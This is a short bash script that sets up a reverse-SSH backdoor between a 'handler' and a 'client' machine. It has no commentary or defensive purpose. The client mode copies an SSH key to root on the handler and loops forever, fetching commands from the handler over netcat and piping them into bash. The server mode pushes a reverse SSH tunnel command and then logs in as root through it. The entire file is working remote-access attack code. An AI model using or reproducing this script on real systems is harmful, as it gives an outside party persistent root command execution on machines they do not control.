mode=$1
local_ip=$2
local_port=$3

function serv_ins {
	echo "ssh -N -R $local_port:localhost:22 root@$local_ip" | sudo timeout 2 nc -l -c -p $local_port
}

if [ $mode = -s ]
	then
	while [ $(sudo netstat -tupln | grep :$local_port | grep sshd | wc -l) = 0 ]
		do
			serv_ins
		done
		echo "[*] Connection established"
		echo "[+] Authenticating to reverse_ssh client"
		ssh -p $local_port root@localhost
elif [ $mode = -c ]
	then
	reconnect_time=$4
	if [ ! -f ~/.ssh/id_rsa.pub ]
		then
		echo "No SSH keypair found... Generating one."
		ssh-keygen
		ssh-copy-id root@$local_ip
	fi
	echo "Checking for Handler interaction every $reconnect_time seconds"
	while true
	do
		echo "Attempting connection..."
		connect=$(nc $local_ip $local_port)
		echo $connect | bash
		sleep $reconnect_time
	done
fi
